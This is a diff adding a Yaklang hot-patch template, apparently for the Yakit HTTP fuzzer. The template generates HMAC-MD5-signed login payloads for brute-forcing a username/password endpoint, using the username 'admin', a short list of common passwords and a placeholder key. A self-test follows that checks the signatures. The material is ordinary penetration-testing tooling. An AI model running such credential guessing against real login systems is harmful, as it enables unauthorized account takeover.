@@ -1,0 +1,56 @@
+/*
+模版名称: [签名-爆破] HMAC-MD5 签名
+对应 i18n key: HTTPFuzzerHotPatch.bruteforce_hmac_md5
+关键词: HMAC-MD5, 签名爆破, fuzz tag, 用户名密码
+适用场景: 登录接口对 username/password 计算 HMAC-MD5 签名后随请求发送，需要爆破
+用法: 在 Fuzzer 包中使用 {{yak(decodeHmacMd5|...)}} 触发，函数返回所有签名后的 JSON 字符串
+*/
+
+// ===== HOT PATCH TEMPLATE START =====
+// HMAC-MD5 签名爆破 - 输出包含 signature 的完整 JSON 字典数组
+decodeHmacMd5 = func(param) {
+    hmacKey = `1234567890abcdef`  /* 替换为目标系统的 HMAC 密钥 */
+    usernameDict = ["admin"]
+    passwordDict = ["admin", "123456", "admin123", "88888888", "666666"]
+    resultList = []
+    for username in usernameDict {
+        for password in passwordDict {
+            data = f"username=${username}&password=${password}"
+            signature = codec.EncodeToHex(codec.HmacMD5(hmacKey, data))
+            m = {
+                "username": username,
+                "password": password,
+                "signature": signature,
+            }
+            resultList.Append(json.dumps(m))
+        }
+    }
+    return resultList
+}
+// ===== HOT PATCH TEMPLATE END =====
+
+// 本地自测代码
+func runSelfTest() {
+    log.info("start hmac md5 bruteforce self test")
+
+    payloads = decodeHmacMd5("placeholder")
+    log.info(sprintf("generated payload count: %d", len(payloads)))
+    assert len(payloads) == 5, "should generate 5 payloads"
+
+    hmacKey = `1234567890abcdef`
+    for p in payloads {
+        parsed = json.loads(p)
+        username = parsed["username"]
+        password = parsed["password"]
+        gotSig = parsed["signature"]
+        data = f"username=${username}&password=${password}"
+        wantSig = codec.EncodeToHex(codec.HmacMD5(hmacKey, data))
+        log.info("got sig: " + gotSig + " expect: " + wantSig)
+        assert gotSig == wantSig, "signature mismatch"
+        assert len(gotSig) == 32, "hmac md5 hex length should be 32"
+    }
+
+    log.info("hmac md5 bruteforce self test passed")
+}
+
+runSelfTest()
